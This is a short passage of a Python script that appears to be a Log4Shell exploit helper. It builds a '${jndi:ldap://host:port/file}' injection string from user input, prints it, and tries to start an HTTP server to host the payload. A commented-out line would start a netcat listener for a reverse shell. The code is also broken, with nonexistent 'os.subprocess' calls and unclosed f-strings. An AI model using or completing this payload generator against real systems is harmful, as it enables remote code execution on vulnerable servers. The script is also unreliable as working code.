  payload2=input("enter payload file:")
    #os.subprocess(f"nc -lvnp {listner port")
    payloadstring=str(payload+":"+payload1+"/"+payload2)
    completedpayload=("${jndi:ldap://"+payloadstring+"}")
    print(f"your payload is {completedpayload}")
    time.sleep(2)
    print("starting http server")
    os.subprocess(f"python3 http.server {httport)

else:
    if start=="2":
        print("goodbye")
        exit()
    

